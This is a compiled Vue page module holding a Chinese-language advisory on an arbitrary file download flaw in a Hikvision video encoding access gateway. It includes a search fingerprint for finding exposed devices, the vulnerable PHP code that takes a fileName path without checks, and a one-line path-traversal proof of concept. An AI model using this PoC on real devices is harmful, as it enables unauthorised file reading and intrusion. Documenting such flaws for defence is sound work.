import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as t,c as i,e as a}from"./app-58e4a7d6.js";const n={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>海康威视视频接入网关系统在页面<code>/serverLog/showFile.php</code>的参数fileName存在任意文件下载漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Hikvision 视频编码设备接入网关
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;视频编码设备接入网关&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191743965.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞文件为 <code>showFile.php</code>, 其中 <code>参数 fileName</code> 没有过滤危险字符，导致可文件遍历下载</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
					$file_name = $_GET[&#39;fileName&#39;];
					$file_path = &#39;../../../log/&#39;.$file_name;
					$fp = fopen($file_path, &quot;r&quot;);
					while($line = fgets($fp)){
						$line = nl2br(htmlentities($line, ENT_COMPAT, &quot;utf-8&quot;));
						echo &#39;&lt;span style=&quot;font-size:16px&quot;&gt;&#39;.$line.&#39;&lt;/span&gt;&#39;;
					}
					fclose($fp);
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/serverLog/showFile.php?fileName=../web/html/main.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191743535.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),l=[d];function s(r,c){return t(),i("div",null,l)}const h=e(n,[["render",s],["__file","HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞.html.vue"]]);export{h as default};
